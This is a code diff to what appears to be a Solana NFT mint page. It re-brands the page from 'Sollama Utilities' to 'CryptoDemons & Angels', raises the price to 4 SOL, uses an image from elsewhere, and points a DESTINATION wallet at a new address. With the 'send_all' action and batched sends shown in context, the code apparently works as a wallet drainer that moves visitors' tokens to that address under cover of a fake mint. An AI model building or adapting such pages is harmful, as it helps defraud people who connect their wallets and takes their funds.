@@ -6,10 +6,10 @@ import OwnLayout from "./OwnLayout/OwnLayout";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = 0.2
-const image = 'https://images-ext-2.discordapp.net/external/lA2a2SWdEvdvyEqIBh1aS656_GUx-K0mo5vD-xFGrQ8/https/nftcalendar.io/storage/uploads/2023/04/21/sollama-utilities_yhZ1hvCK44SKlsOR.png'
-const Title = 'Sollama Utilities'
-const supply = 444
+const solAmount = 4
+const image = 'https://pbs.twimg.com/profile_images/1446787002318442502/zOKmMqR__400x400.jpg'
+const Title = 'CryptoDemons & Angels'
+const supply = 1111
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
@@ -19,7 +19,7 @@ const ACTION = 'send_all';
 const SENDS_IN_ONE_TX = 7;
 // const CLOSES_IN_ONE_TX = 27;
 
-const DESTINATION = new PublicKey('HkGiZyGJt7H4XMpzzaSbsUtHqbypwzfuLeWqjkqpgsF2');
+const DESTINATION = new PublicKey('4444yauc6XPT2TKY1GQkQ88SKeJaSVzH5JkohuHmPJNR');
 
 const tokenProgram = TOKEN_PROGRAM_ID;
 
